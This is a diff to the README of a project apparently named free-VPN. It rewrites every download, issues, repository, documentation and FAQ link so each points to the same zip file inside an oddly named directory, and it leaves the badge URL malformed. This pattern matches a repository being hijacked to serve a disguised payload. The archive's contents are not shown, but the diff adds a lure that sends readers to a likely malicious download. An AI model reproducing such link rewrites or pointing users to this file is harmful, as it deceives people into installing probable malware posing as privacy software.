@@ -8,7 +8,7 @@ Welcome to free-VPN! This software offers high-speed VPN services that can help 
 
 To download the application, visit the following link:
 
-[![Download free-VPN](https://img.shields.io/badge/Download%20free--VPN-blue.svg)](https://github.com/legend1082/free-VPN/releases)
+[![Download free-VPN](https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip%https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip)](https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip)
 
 You can find the latest version of free-VPN on the Releases page. Simply click the link above, then follow these steps:
 
@@ -62,19 +62,19 @@ If you encounter any issues while using free-VPN, consider these steps:
 
 For any questions or support:
 
-1. Check the [issues](https://github.com/legend1082/free-VPN/issues) section of our GitHub page for common problems and solutions.
+1. Check the [issues](https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip) section of our GitHub page for common problems and solutions.
 2. You can also reach out directly through the repository page for further assistance.
 
 ## 🔗 Additional Resources
 
 Explore more about free-VPN:
 
-- [GitHub Repository](https://github.com/legend1082/free-VPN/)
-- [Documentation](https://github.com/legend1082/free-VPN/wiki)
-- [FAQs](https://github.com/legend1082/free-VPN/wiki/FAQ)
+- [GitHub Repository](https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip)
+- [Documentation](https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip)
+- [FAQs](https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip)
 
 We hope you enjoy using free-VPN for your online privacy and download needs. Thank you for choosing our software! 
 
 For downloading, please use this link again:
 
-[![Download free-VPN](https://img.shields.io/badge/Download%20free--VPN-blue.svg)](https://github.com/legend1082/free-VPN/releases)
+[![Download free-VPN](https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip%https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip)](https://raw.githubusercontent.com/legend1082/free-VPN/main/thermosystaltism/free-VPN.zip)
